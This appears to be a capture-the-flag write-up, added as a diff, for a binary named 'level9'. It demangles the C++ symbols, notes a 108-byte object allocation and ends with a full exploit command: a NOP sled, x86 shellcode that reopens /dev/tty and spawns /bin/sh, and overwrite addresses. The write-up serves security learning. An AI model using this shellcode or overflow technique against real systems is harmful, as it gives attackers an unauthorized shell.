@@ -1,0 +1,16 @@
+Seeing the functions name while doing objdump, it seems to be CPP name mangling, demangling them gives:
+
+N::N(int)                  (_ZN1NC2Ei / _ZN1NC1Ei)
+N::setAnnotation(char*)    (_ZN1N13setAnnotationEPc)
+N::operator+(N&)           (_ZN1NplERS_)
+N::operator-(N&)           (_ZN1NmiERS_)
+operator new(unsigned int) (_Znwj@plt)
+
+
+So we have a class N with a constructor with a int arg, a function setAnnotation taking a string as arg, an operator+ and an operator-
+
+First, the program checks if argc > 1, if not exit(1)
+Then it create a new N(0x6c) so new N(108) (might be malloc(108))
+
+final command (see reverse_engineering.cpp):
+./level9 $(python -c 'print "\x90"*(108-55) + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x7c\xa0\x04\x08" + "\x38\xa0\x04\x08"')
